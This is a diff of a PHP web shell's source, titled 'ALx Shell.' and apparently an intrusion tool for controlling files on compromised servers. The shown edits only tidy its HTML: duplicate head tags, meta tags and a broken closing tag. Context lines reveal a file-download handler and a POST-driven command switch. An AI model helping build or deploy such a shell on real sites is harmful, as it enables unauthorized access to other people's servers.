@@ -275,14 +275,17 @@ if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')
     exit;
 }
 ?>
-<html><head>
+
+<html>
+<head>
 <title>ALx Shell.</title>
+<meta name='author' content='ALxWahid'>
+<meta charset="UTF-8">
 <!--- Jquery 2.1.3 --->
 <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 
 <!--- Font Awesome 4.7.0 --->
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
-
 
 <!--- Loader Style --->
 <style>
@@ -371,10 +374,7 @@ pulsate();
   <div id="loading-content"></div>
 </div>
 	<audio autoplay> <source src="https://archive.org/download/BeepsShort/Beeps%20Short.wav" type="audio/mpeg"></audio>
-<html>
-<head>
-<meta name='author' content='ALxWahid'>
-<meta charset="UTF-8">
+
 <style type='text/css'>
 @import url(https://fonts.googleapis.com/css?family=Ubuntu);
 html {
@@ -449,8 +449,7 @@ option:hover {
 	color: #000000;
 }
 </style>
-<html>
-<head>
+
 <style type="text/css">
 body {
     background: #008000;
@@ -670,7 +669,7 @@ switch ($_POST['method']) {
 }?>
 </div>
 </body>
-</html
+</html>
 <?php
 ?>
 </head>
